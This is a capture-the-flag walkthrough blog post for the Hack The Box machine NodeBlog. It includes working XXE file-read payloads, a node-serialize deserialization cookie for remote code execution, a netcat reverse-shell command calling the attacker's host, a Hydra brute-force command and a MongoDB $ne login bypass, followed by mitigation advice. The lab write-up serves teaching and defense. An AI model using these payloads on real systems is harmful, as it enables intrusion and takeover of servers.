---
layout: post
title: Hack The Box Walkthrough - NodeBlog
date: 2022-05-07
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
permalink: /2022/05/HTB/NodeBlog
img: 2022/05/NodeBlog/NodeBlog.png
---

This is an easy machine where you have to abuse a Node application. You can read files on the server with an [XXE vulnerability](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing). Then you get remote code execution by unserializing unsafe data. Once you use the RCE to get a shell, getting root is very easy.


* Room: NodeBlog
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/NodeBlog](https://app.hackthebox.com/machines/NodeBlog)
* Author: [ippsec](https://app.hackthebox.com/users/3769)

## Enumeration

As always, I began the machine by running RustScan to enumerate the opened ports.

```bash
$ rustscan -a target.htb -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :                                                                                                                                                                                                    --------------------------------------                                                                                                                                                                                                    🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.96.160:22
Open 10.129.96.160:5001
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-25 18:54 EDT

...

Scanned at 2022-04-25 18:54:41 EDT for 13s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZBURYGCLr4lZI1F55bUh/6vKCfmeGumtAhhNrg9lH4UNDB/wCjPbD+xovPp3UdbrOgNdqTCdZcOk5rQDyRK2YH6tq8NlP59myIQV/zXC9WQnhxn131jf/KlW78vzWaLfMU+m52e1k+YpomT5PuSMG8EhGwE5bL4o0Jb8Unafn13CJKZ1oj3awp31fRJDzYGhTj
l910PROJAzlOQinxRYdUkc4ZT0qZRohNlecGVsKPpP+2Ql+gVuusUEQt7gPFPBNKw3aLtbLVTlgEW09RB9KZe6Fuh8JszZhlRpIXDf9b2O0rINAyek8etQyFFfxkDBVueZA50wjBjtgOtxLRkvfqlxWS8R75Urz8AR2Nr23AcAGheIfYPgG8HzBsUuSN5fI8jsBCekYf/ZjPA/YDM4aiyHbUWfCyjTqtAVTf3P4iqbE
kw9DONGeohBlyTtEIN7pY3YM5X3UuEFIgCjlqyjLw6QTL4cGC5zBbrZml7eZQTcmgzfU6pu220wRo5GtQ3U=
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZPKXFj3JfSmJZFAHDyqUDFHLHBRBRvlesLRVAqq0WwRFbeYdKwVIVv0DBufhYXHHcUSsBRw3/on9QM24kymD0=
|   256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEDIBMvrXLaYc6DXKPZaypaAv4yZ3DNLe1YaBpbpB8aY
5000/tcp open  http    syn-ack Node.js (Express middleware)
|_http-title: Blog
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There were two opened ports. Port 22 for SSH access, and port 5000 with a Node.js application built with the [Express framework](https://expressjs.com/).



## Web Site

I launched Burp and Firefox and navigated to [http://target.htb:5000/](http://target.htb:5000/).

![Blog](/assets/images/2022/05/NodeBlog/MainSite.png "Blog")

It was a simple blog, with one article and a login form. I launch ferboxbuster to look for hidden files and directories.

```bash
$ feroxbuster -u http://target.htb:5000 -w /usr/share/seclists/Discovery/Web-Content/common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb:5000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       47l      133w     1891c http://target.htb:5000/
200      GET       28l       59w     1002c http://target.htb:5000/Login
200      GET       28l       59w     1002c http://target.htb:5000/login
[####################] - 4s      9424/9424    0s      found:3       errors:0
[####################] - 3s      4712/4712    1238/s  http://target.htb:5000
[####################] - 3s      4712/4712    1253/s  http://target.htb:5000/
```

It did not find anything new. I tried the login form. When I tried connecting with the username admin, I got an error saying 'Invalid Password'. When I used other usernames, the error was 'Invalid Username'. That told me that there was an admin user, so I tried to brute force the password with Hydra.

```bash
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -u -e snr -t64 -m '/login:user=^USER^&password=^PASS^:Invalid' -s 5000 target.htb http-post-form
```

I let it run for a while, but it did not find the password.

When I clicked on the 'Read More' button for the article, I was taken to '/articles/uhc-qualifiers'. I enumerated the files in the `/articles` folder also.

```bash
$ feroxbuster -u http://target.htb:5000/articles -w /usr/share/seclists/Discovery/Web-Content/common.txt -C 302 -C 404

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb:5000/articles
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 💢  Status Code Filters   │ [302, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       33l       73w     1234c http://target.htb:5000/articles/new
200      GET       21l       40w      713c http://target.htb:5000/articles/test
[####################] - 10s     4712/4712    0s      found:2       errors:1157
[####################] - 10s     4712/4712    455/s   http://target.htb:5000/articles
```

It found two pages. `/articles/test` was just another article. But `/articles/new` allowed me to create new posts.

![New Article](/assets/images/2022/05/NodeBlog/NewArticle.png "New Article")

I created a bunch of posts. And tried some [XSS](https://owasp.org/www-community/attacks/xss/). But I did not manage to exploit anything there.

I went back to the home page and looked at the source code. I saw some Javascript that was posting a form.

```js
<script language="JavaScript"><!--
    function myFunction() {
        document.getElementById("uploadxml").click()
    }
    function DialogClose() {
        document.getElementById("uploadform").action = "/articles/xml"
        document.getElementById("uploadform").onsubmit = ""
        document.getElementById("uploadform").submit()
    }
//--></script>
```

The form was not on the page, and there was no button to trigger the post. I used Burp to post to the it.

```http
POST /articles/xml HTTP/1.1
Host: target.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://target.htb:5000
Connection: close
Referer: http://target.htb:5000/login
Upgrade-Insecure-Requests: 1
```

The response showed me the XML it was expecting.

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 144
ETag: W/"90-v0DoTdXwQk7iInwC6sdbQSWTk3E"
Date: Tue, 26 Apr 2022 03:23:35 GMT
Connection: close

Invalid XML Example: <post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>
```

I knew the format of the expected XML, but not how it should be posted. I used Burp to intercept a response and injected an upload form in it. I posted it, but I did not know the name to use. After some experimentation, I found it was simply `file`.

```http
POST /articles/xml HTTP/1.1
Host: target.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"763-yBLqx1Bg/Trp0SZ2cyMSGFoH5nU"
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=---------------------------134965792736974121853184188709
Content-Length: 381

-----------------------------134965792736974121853184188709
Content-Disposition: form-data; name="file"; filename="test.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>

-----------------------------134965792736974121853184188709--
```

The response was a form to edit the new post.

```html
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1319
ETag: W/"527-5TkaGo5fFVhbgeClz3JhJp6OlGo"
Date: Thu, 28 Apr 2022 02:59:47 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <title>Blog</title>
</head>
<body>
    <div class="container">
        <h1 class="mb-4">Edit Article</h1>

        <form action="/articles/626a032362c6eab1a2bb4711?_method=PUT" method="POST">
            <div class="form-group">
    <label for="title">Title</label>
    <input required value="Example Post" type="text" name="title" id="title" class="form-control">
  </div>
  <div class="form-group">
    <label for="description">Description</label>
    <textarea name="description" id="description" class="form-control">Example Description</textarea>
  </div>
  <div class="form-group">
    <label for="markdown">Markdown</label>
    <textarea required name="markdown" id="markdown" class="form-control">Example Markdown</textarea>
  </div>

  <a href="/" class="btn btn-secondary">Cancel</a>
  <button type="submit" class="btn btn-primary">Save</button>
        </form>
    </div>
</body>
</html>
```

Next, I tried some XXE with the upload.

```http
POST /articles/xml HTTP/1.1
Host: target.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"763-yBLqx1Bg/Trp0SZ2cyMSGFoH5nU"
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=---------------------------134965792736974121853184188709
Content-Length: 381

-----------------------------134965792736974121853184188709
Content-Disposition: form-data; name="file"; filename="test.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<post><title>aaa Post</title><description>Example Description</description><markdown>&file;</markdown></post>

-----------------------------134965792736974121853184188709--
```

The content of the `/etc/passwd` file was returned in the markdown field.

```html
   <label for="markdown">Markdown</label>
    <textarea required name="markdown" id="markdown" class="form-control">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
admin:x:1000:1000:admin:/home/admin:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mongodb:x:109:117::/var/lib/mongodb:/usr/sbin/nologin
</textarea>
```

I could read files on the server. But I had a hard time finding something valuable. I tried reading the user flag from the admin's home folder, but it failed. I also tried loading a private key from `/home/admin/.ssh/id_rsa`, but it was not there, or I could not read it. I tried index.js and index.html. Still nothing.

After some searching, I remembered that I had an error with a stack trace earlier. I tried posting to `/articles`, and got the error again.

```http
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 564
Date: Sat, 07 May 2022 20:20:48 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: Failed to lookup view &quot;articles/${path}&quot; in views directory &quot;/opt/blog/views&quot;<br> &nbsp; &nbsp;at Function.render (/opt/blog/node_modules/express/lib/application.js:580:17)<br> &nbsp; &nbsp;at ServerResponse.render (/opt/blog/node_modules/express/lib/response.js:1012:7)<br> &nbsp; &nbsp;at /opt/blog/routes/articles.js:81:17<br> &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:95:5)</pre>
</body>
</html>
```

This gave me the full path of the application on the server. I used that to try `index.js` again. Still no luck. Next, I tried `server.js`.

```http
POST /articles/xml HTTP/1.1
Host: target.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"763-yBLqx1Bg/Trp0SZ2cyMSGFoH5nU"
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=---------------------------134965792736974121853184188709
Content-Length: 441

-----------------------------134965792736974121853184188709
Content-Disposition: form-data; name="file"; filename="test.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///opt/blog/server.js">
]>
<post><title>aaa Post</title><description>Example Description</description><markdown>&file;</markdown></post>

-----------------------------134965792736974121853184188709--
```

It gave me the content of the Express server.

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 2946
ETag: W/"b82-3qAMAXZKj7NFbx0LiRm9SNwjQOc"
Date: Sat, 07 May 2022 20:26:11 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <title>Blog</title>
</head>
<body>
    <div class="container">
        <h1 class="mb-4">Edit Article</h1>

        <form action="/articles/6276d5e34217e103f12120d4?_method=PUT" method="POST">
            <div class="form-group">
    <label for="title">Title</label>
    <input required value="aaa Post" type="text" name="title" id="title" class="form-control">
  </div>
  <div class="form-group">
    <label for="description">Description</label>
    <textarea name="description" id="description" class="form-control">Example Description</textarea>
  </div>
  <div class="form-group">
    <label for="markdown">Markdown</label>
    <textarea required name="markdown" id="markdown" class="form-control">const express = require(&#39;express&#39;)
const mongoose = require(&#39;mongoose&#39;)
const Article = require(&#39;./models/article&#39;)
const articleRouter = require(&#39;./routes/articles&#39;)
const loginRouter = require(&#39;./routes/login&#39;)
const serialize = require(&#39;node-serialize&#39;)
const methodOverride = require(&#39;method-override&#39;)
const fileUpload = require(&#39;express-fileupload&#39;)
const cookieParser = require(&#39;cookie-parser&#39;);
const crypto = require(&#39;crypto&#39;)
const cookie_secret = &#34;UHC-SecretCookie&#34;
//var session = require(&#39;express-session&#39;);
const app = express()

mongoose.connect(&#39;mongodb://localhost/blog&#39;)

app.set(&#39;view engine&#39;, &#39;ejs&#39;)
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride(&#39;_method&#39;))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: &#34;UHC-SecretKey-123&#34;}));

function authenticated(c) {
    if (typeof c == &#39;undefined&#39;)
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash(&#39;md5&#39;).update(cookie_secret + c.user).digest(&#39;hex&#39;)) ){
        return true
    } else {
        return false
    }
}


app.get(&#39;/&#39;, async (req, res) =&gt; {
    const articles = await Article.find().sort({
        createdAt: &#39;desc&#39;
    })
    res.render(&#39;articles/index&#39;, { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
})

app.use(&#39;/articles&#39;, articleRouter)
app.use(&#39;/login&#39;, loginRouter)


app.listen(5000)
</textarea>
  </div>

  <a href="/" class="btn btn-secondary">Cancel</a>
  <button type="submit" class="btn btn-primary">Save</button>
        </form>
    </div>
</body>
</html>
```
I used [CyberChef's "From HTML Entity"](https://gchq.github.io/CyberChef/#recipe=From_HTML_Entity()) to decode it.

```js
const express = require('express')
const mongoose = require('mongoose')
const Article = require('./models/article')
const articleRouter = require('./routes/articles')
const loginRouter = require('./routes/login')
const serialize = require('node-serialize')
const methodOverride = require('method-override')
const fileUpload = require('express-fileupload')
const cookieParser = require('cookie-parser');
const crypto = require('crypto')
const cookie_secret = "UHC-SecretCookie"
//var session = require('express-session');
const app = express()

mongoose.connect('mongodb://localhost/blog')

app.set('view engine', 'ejs')
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride('_method'))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: "UHC-SecretKey-123"}));

function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
        return true
    } else {
        return false
    }
}


app.get('/', async (req, res) => {
    const articles = await Article.find().sort({
        createdAt: 'desc'
    })
    res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
})

app.use('/articles', articleRouter)
app.use('/login', loginRouter)


app.listen(5000)
```

The file contained two secrets. I took note of them and kept reading. 

```js
//app.use(session({secret: "UHC-SecretKey-123"}));
const cookie_secret = "UHC-SecretCookie"
```

The `authenticated` function had an interesting line.

```js
c = serialize.unserialize(c)
```

This was taking the content of the `auth` cookie and unserializing it. I was sure I could use that to execute some arbitrary code.

I did a quick search for 'nodejs unserialize exploit' and the first result was [a blog with code very similar to the one I had](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/).

I used the code from the blog to generate a simple payload.

```
var y = {
rce : function(){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

I used the output to create an auth cookie and send it to the server. It did not respond. It must have crashed when it loaded my payload. I took the server code and simplified it to run it locally and test my payloads.

```js
const express = require('express')
const serialize = require('node-serialize')
const methodOverride = require('method-override')
const cookieParser = require('cookie-parser');
const crypto = require('crypto')
const app = express()

app.set('view engine', 'ejs')
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride('_method'))
app.use(express.json());
app.use(cookieParser());

function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    //console.log(c);
    c = serialize.unserialize(c)
    //console.log(c);
}


app.get('/', async (req, res) => {
    authenticated(req.cookies.auth)
    res.json({});
})

app.listen(5000)
```

With this, I was able to build a working payload. It turned out the semicolon was causing the issue.

```http
GET / HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cookie: auth={"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}()"}
```
When I sent it, I got a response and saw the output from `ls` in my terminal.

```bash
$ node server.js
bin
boot
dev
etc
home
...
```

Next, I worked on building a payload to get a reverse shell. Once I got it working locally, I sent it to the server.

```http
GET / HTTP/1.1
Host: target.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: auth={"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('mkfifo /tmp/kirxhbg && nc 10.10.14.122 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1 && rm /tmp/kirxhbg', function(error, stdout, stderr) { console.log(stderr) })}()"}
Upgrade-Insecure-Requests: 1
If-None-Match: W/"763-yBLqx1Bg/Trp0SZ2cyMSGFoH5nU"
```

That got me my foothold on the server.

```bash
$ nc -klvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.96.160 46916

whoami
admin
```

I tried reading the user flag but I could not access the home folder, it was not executable.

```bash
admin@nodeblog:/opt/blog$ ls -l /home/admin/
ls: cannot access '/home/admin/user.txt': Permission denied
total 0
-????????? ? ? ? ?            ? user.txt

admin@nodeblog:/opt/blog$ ls -ld /home/admin/
drw-r--r-- 1 admin admin 220 Jan  3 17:16 /home/admin/
```

## Privilege Escalation

Now that I was connected on the server, I tried to get root access. I looked at `sudo -l`, but it required a password that I did not have. From the code, I knew that the site used a Mongo database. I connected to it and looked at what it contained. 

```bash
admin@nodeblog:/opt/blog$ mongo
MongoDB shell version v3.6.8
connecting to: mongodb://127.0.0.1:27017
Implicit session: session { "id" : UUID("a9efe6fb-27a9-4a88-850e-48783530e7bc") }
MongoDB server version: 3.6.8
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
2022-05-08T01:12:23.168+0000 I STORAGE  [main] In File::open(), ::open for '/home/admin/.mongorc.js' failed with Permission denied
Server has startup warnings:
2022-05-08T01:02:33.446+0000 I CONTROL  [initandlisten]
2022-05-08T01:02:33.446+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2022-05-08T01:02:33.446+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2022-05-08T01:02:33.446+0000 I CONTROL  [initandlisten]
2022-05-08T01:12:23.169+0000 E -        [main] Error loading history file: FileOpenFailed: Unable to fopen() file /home/admin/.dbshell: Permission denied

> show dbs
admin   0.000GB
blog    0.000GB
config  0.000GB
local   0.000GB

> use blog
switched to db blog

> show collections
articles
users

> db.users.find()
{ "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
```

The `users` collection had the admin password in clear text. I tried it with sudo, and it worked. 

```
admin@nodeblog:/opt/blog$ sudo -l
[sudo] password for admin:
Matching Defaults entries for admin on nodeblog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
```

Admin was allowed to run any command as any user. I used that to su as root, and read both flags.

```bash
admin@nodeblog:/opt/blog$ sudo su -

root@nodeblog:~# ls /home/admin
user.txt

root@nodeblog:~# cat /home/admin/user.txt
REDACTED

root@nodeblog:~# ls /root
root.txt  snap

root@nodeblog:~# cat /root/root.txt
REDACTED
```


## Mitigation

After I got root access, I looked at how the box could be protected. The first issue to prevent is the XXE. The code uses the [Libxmljs](https://github.com/libxmljs/libxmljs/wiki) library to parse the XML.

```js
const doc = libxmljs.parseXmlString(xml, {noent: true,noblanks:true})
```

To prevent this vulnerability, [noent should be set to false](https://rules.sonarsource.com/javascript/RSPEC-2755). I changed it in the code, restarted the web server, and my XML payload stopped working.

The next problem is the unserializing that led to the RCE. Unserialize should never be used on user supplied data. Unserializing makes it easy to execute some random code on the server. The cookie should have only contained a session id. This id could then be validated and used to retrieve the user's data from the session. 

Finally, I was able to get root because I found the admin's password in the database. Passwords should never be stored in clear. They should always be hashed before they are stored anywhere.

And more important, passwords should not be reused. The password used for connecting to the blog should not have given access to the user on the server.



## Mongo Injection

After I publihed this post, I started watching [IppSec's video of the box](https://www.youtube.com/watch?v=ahzOprfN--Y). At the beginning he mentioned that it's vulnerable to MongoDB injection. I completly missed that. So I launched back the box and tried to abuse it.

I used Burp Repeater to play with the login form post. If you change the `Content-Type` header, you can post json to it. From there, I could change the password value to `"$ne": 1` to get a valid login.

```http
POST /login HTTP/1.1
Host: target.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 25
Origin: http://target.htb:5000
Connection: close
Referer: http://target.htb:5000/login
Upgrade-Insecure-Requests: 1

{
"user": "admin",
"password":{"$ne": 1}
}
```

And I was connected on the blog.

![Connected](/assets/images/2022/05/NodeBlog/BlogConnected.png "Connected")

I wish I saw that while working on the box. It would have made the XXE easier to find. And the format of the `auth` cookie might have hinted the serialization issue. I need to get in the habbit of testing this.
